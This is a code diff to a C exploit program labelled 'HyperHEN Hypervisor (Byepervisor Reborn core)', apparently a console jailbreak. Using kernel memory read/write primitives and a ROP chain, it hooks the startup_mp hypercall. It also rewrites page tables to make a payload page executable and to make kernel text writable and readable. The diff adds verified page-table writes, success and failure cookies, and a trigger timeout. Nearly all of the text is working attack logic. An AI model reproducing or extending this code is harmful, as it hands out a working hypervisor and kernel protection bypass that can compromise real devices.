@@ -15,15 +15,16 @@
 #include "hyperhen_integration.h"
 
 #include "break_hv_payload/break_hv.h"
+#include "break_hv_payload/hypervisor_protocol.h"
 
 #define STATE_ARMED               0x4B484F4F4B454401ULL // 'KHOOKED.'
-#define COOKIE_VAL                0xCAFE133741414141ULL
 #define HOOK_CORE                 0
 #define HOOK_IST                  6
 #define CAVE_STATE_OFF            0x600
 #define CAVE_SAVE_OFF             0x620
 #define TSS_STRIDE                0x68
 #define STARTUP_MP_PAYLOAD_PAGE   0x3FFFF000
+#define HV_TRIGGER_TIMEOUT_POLLS  12
 
 #define HV_LOADER_PA_REGULAR      0x062800000
 #define HV_LOADER_PA_PRO          0x8e0800000
@@ -59,7 +60,7 @@ static int install_test_hook(int core_id, uint64_t cave)
 
   uint64_t oracle = kh_user_data_addr(&hook);
   kh_chain_init(&chain, chain_buf, sizeof chain_buf);
-  kh_chain_store(&chain, oracle, COOKIE_VAL);
+  kh_chain_store(&chain, oracle, HV_TRIGGER_COOKIE);
 
   ret = kh_install(&hook, &chain);
   if (ret) return ret;
@@ -100,7 +101,7 @@ static int install_resume_hook(int core_id, uint64_t cave, uint64_t cr3)
 
   oracle = kh_user_data_addr(&hook);
   kh_chain_init(&chain, chain_buf, sizeof chain_buf);
-  kh_chain_store(&chain, oracle, COOKIE_VAL);
+  kh_chain_store(&chain, oracle, HV_TRIGGER_COOKIE);
 
   kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
   kh_chain_q(&chain, cr3);
@@ -151,6 +152,101 @@ static void uninstall_hook(int core_id, uint64_t cave)
   kwrite64(cave + CAVE_STATE_OFF, 0);
 }
 
+static int write_page_entry_checked(uint64_t address, uint64_t value)
+{
+  if (address == 0xFFFFFFFFFFFFFFFFull)
+    return -1;
+  kwrite64(address, value);
+  return kread64(address) == value ? 0 : -1;
+}
+
+static int prepare_startup_payload_mapping(uint64_t kernel_pmap)
+{
+  uint64_t address;
+  uint64_t entry;
+
+  address = find_pml4e(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &entry);
+  if (address == 0xFFFFFFFFFFFFFFFFull)
+    return -1;
+  CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
+  if (write_page_entry_checked(address, entry))
+    return -1;
+
+  address = find_pdpe(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &entry);
+  if (address == 0xFFFFFFFFFFFFFFFFull)
+    return -1;
+  CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
+  if (write_page_entry_checked(address, entry))
+    return -1;
+  if (PDE_FIELD(entry, PS))
+    return 0;
+
+  address = find_pde(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &entry);
+  if (address == 0xFFFFFFFFFFFFFFFFull)
+    return -1;
+  CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
+  if (write_page_entry_checked(address, entry))
+    return -1;
+  if (PDE_FIELD(entry, PS))
+    return 0;
+
+  address = find_pte(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &entry);
+  if (address == 0xFFFFFFFFFFFFFFFFull)
+    return -1;
+  CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
+  return write_page_entry_checked(address, entry);
+}
+
+static int unlock_kernel_text(uint64_t kernel_pmap)
+{
+  uint64_t last_pdpe = 0xFFFFFFFFFFFFFFFFull;
+  uint64_t last_pde = 0xFFFFFFFFFFFFFFFFull;
+  unsigned int verified_entries = 0;
+
+  for (uint64_t addr = ktext(0); addr < KERNEL_ADDRESS_DATA_BASE;
+       addr += 0x1000) {
+    uint64_t entry;
+    uint64_t entry_addr = find_pdpe(kernel_pmap, addr, &entry);
+    if (entry_addr == 0xFFFFFFFFFFFFFFFFull)
+      continue;
+    if (entry_addr != last_pdpe) {
+      last_pdpe = entry_addr;
+      CLEAR_PDE_BIT(entry, XOTEXT);
+      SET_PDE_BIT(entry, RW);
+      if (write_page_entry_checked(entry_addr, entry))
+        return -1;
+      verified_entries++;
+    }
+    if (PDE_FIELD(entry, PS))
+      continue;
+
+    entry_addr = find_pde(kernel_pmap, addr, &entry);
+    if (entry_addr == 0xFFFFFFFFFFFFFFFFull)
+      continue;
+    if (entry_addr != last_pde) {
+      last_pde = entry_addr;
+      CLEAR_PDE_BIT(entry, XOTEXT);
+      SET_PDE_BIT(entry, RW);
+      if (write_page_entry_checked(entry_addr, entry))
+        return -1;
+      verified_entries++;
+    }
+    if (PDE_FIELD(entry, PS))
+      continue;
+
+    entry_addr = find_pte(kernel_pmap, addr, &entry);
+    if (entry_addr == 0xFFFFFFFFFFFFFFFFull)
+      continue;
+    CLEAR_PDE_BIT(entry, XOTEXT);
+    SET_PDE_BIT(entry, RW);
+    if (write_page_entry_checked(entry_addr, entry))
+      return -1;
+    verified_entries++;
+  }
+
+  return verified_entries ? 0 : -1;
+}
+
 int main(void)
 {
   uint64_t test_val;
@@ -161,15 +257,8 @@ int main(void)
   uint64_t oracle;
   uint64_t kernel_pmap;
   uint64_t kernel_pm_cr3;
-  uint64_t pml4e_addr;
-  uint64_t pdpe_addr;
-  uint64_t pte_addr;
-  uint64_t pde_addr;
-  uint64_t pml4e;
-  uint64_t pdpe;
-  uint64_t pde;
-  uint64_t pte;
   uint64_t o;
+  int trigger_polls = 0;
 
   hyperhen_hv_begin();
   printf("[+] HyperHEN Hypervisor (Byepervisor Reborn core)\n");
@@ -208,7 +297,8 @@ int main(void)
   // This is so we can send the same payload after resume to experiment with post-HV hax (or not if we want to debug the resume payload)
 #define DEBUG_MP_STARTUP_PAYLOAD 0
 #if DEBUG_MP_STARTUP_PAYLOAD == 0
-  if (kread64(oracle) != 0) {
+  o = kread64(oracle);
+  if (o == HV_SUCCESS_COOKIE) {
     printf("Hypervisor route is already active\n");
     test_val = kread64(ktext(0));
     test_val_bytes = (uint8_t *) &test_val;
@@ -218,6 +308,20 @@ int main(void)
       test_val_bytes[4], test_val_bytes[5], test_val_bytes[6], test_val_bytes[7]);
 
     return 0;
+  }
+  if (o == HV_FAILURE_COOKIE) {
+    printf("[!] Previous hypervisor attempt reported failure\n");
+    notifyf("[HyperHEN Hypervisor]\nPrevious resume attempt did not complete");
+    hyperhen_hv_mark_failed();
+    return EXIT_FAILURE;
+  }
+  if (o == HV_TRIGGER_COOKIE &&
+      kread64(cave + CAVE_STATE_OFF) == STATE_ARMED) {
+    printf("[!] Previous resume hook did not complete\n");
+    uninstall_hook(HOOK_CORE, cave);
+    notifyf("[HyperHEN Hypervisor]\nPrevious resume hook did not complete");
+    hyperhen_hv_mark_failed();
+    return EXIT_FAILURE;
   }
 #endif
 
@@ -274,42 +378,15 @@ int main(void)
     return EXIT_FAILURE;
   }
 
-  pml4e_addr = find_pml4e(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pml4e);
-  CLEAR_PDE_BIT(pml4e, EXECUTE_DISABLE);
-  kwrite64(pml4e_addr, pml4e);
-
-  pdpe_addr = find_pdpe(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pdpe);
-  CLEAR_PDE_BIT(pdpe, EXECUTE_DISABLE);
-  kwrite64(pdpe_addr, pdpe);
-
-  if (PDE_FIELD(pdpe, PS) != 1) {
-    pde_addr = find_pde(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pde);
-    CLEAR_PDE_BIT(pde, EXECUTE_DISABLE);
-    kwrite64(pde_addr, pde);
-
-    if (PDE_FIELD(pde, PS) != 1) {
-      pte_addr = find_pte(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pte);
-      CLEAR_PDE_BIT(pte, EXECUTE_DISABLE);
-      kwrite64(pte_addr, pte);
-    }
+  if (prepare_startup_payload_mapping(kernel_pmap)) {
+    notifyf("[HyperHEN Hypervisor]\nStartup payload mapping is invalid");
+    hyperhen_hv_mark_failed();
+    return EXIT_FAILURE;
   }
-
-  // Disable xotext + enable write on kernel .text pages
-  printf("[+] Disabling xotext + enabling write...\n");
-  for (uint64_t addr = ktext(0); addr < KERNEL_ADDRESS_DATA_BASE; addr += 0x1000) {
-    pde_addr = find_pde(kernel_pmap, addr, &pde);
-    if (pde_addr != 0xFFFFFFFFFFFFFFFFull) {
-      CLEAR_PDE_BIT(pde, XOTEXT);
-      SET_PDE_BIT(pde, RW);
-      kwrite64(pde_addr, pde);
-    }
-
-    pte_addr = find_pte(kernel_pmap, addr, &pte);
-    if (pte_addr != 0xFFFFFFFFFFFFFFFFull) {
-      CLEAR_PDE_BIT(pte, XOTEXT);
-      SET_PDE_BIT(pte, RW);
-      kwrite64(pte_addr, pte);
-    }
+  if (unlock_kernel_text(kernel_pmap)) {
+    notifyf("[HyperHEN Hypervisor]\nKernel text mapping verification failed");
+    hyperhen_hv_mark_failed();
+    return EXIT_FAILURE;
   }
 
   // Install hook on startup_mp hypercall
@@ -336,7 +413,7 @@ int main(void)
     pin_to_core(HOOK_CORE);
 
     o = kread64(oracle);
-    if (o != 0) {
+    if (o == HV_SUCCESS_COOKIE) {
       printf("[+] Uninstalling hook\n");
       uninstall_hook(HOOK_CORE, cave);
 
@@ -350,6 +427,24 @@ int main(void)
       // TODO: Patch kernel and all that fun stuff, we don't feel like doing this so someone else can do it :)
 
       return 0;
+    }
+    if (o == HV_FAILURE_COOKIE) {
+      printf("[!] Hypervisor payload did not complete\n");
+      uninstall_hook(HOOK_CORE, cave);
+      notifyf("[HyperHEN Hypervisor]\nResume payload did not complete");
+      hyperhen_hv_mark_failed();
+      return EXIT_FAILURE;
+    }
+    if (o == HV_TRIGGER_COOKIE) {
+      if (++trigger_polls >= HV_TRIGGER_TIMEOUT_POLLS) {
+        printf("[!] Hypervisor completion timed out after hook trigger\n");
+        uninstall_hook(HOOK_CORE, cave);
+        notifyf("[HyperHEN Hypervisor]\nResume completion timed out");
+        hyperhen_hv_mark_failed();
+        return EXIT_FAILURE;
+      }
+    } else {
+      trigger_polls = 0;
     }
 
     sceKernelSleep(5);
